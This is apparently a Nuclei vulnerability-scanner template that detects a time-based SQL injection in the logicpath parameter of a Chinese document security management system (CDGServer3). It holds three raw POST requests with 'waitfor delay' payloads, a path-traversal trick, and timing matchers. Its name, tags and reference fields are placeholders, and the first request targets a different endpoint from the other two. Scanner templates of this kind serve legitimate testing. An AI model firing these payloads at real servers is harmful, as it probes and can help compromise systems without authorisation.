id: yst-logicpath-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 亿某通电子文档安全管理系统` DocInfoAjax`接口的`logicpath`参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /CDGServer3/js/../DocInfoAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 59

        command=JudgeHasFile&logicpath==-1'waitfor delay '0:0:3'--
      - |-
        POST /CDGServer3/js/../DeviceAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 59

        command=JudgeHasFile&logicpath==-1'waitfor delay '0:0:6'--
      - |-
        POST /CDGServer3/js/../DeviceAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 59

        command=JudgeHasFile&logicpath==-1'waitfor delay '0:0:9'--
    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"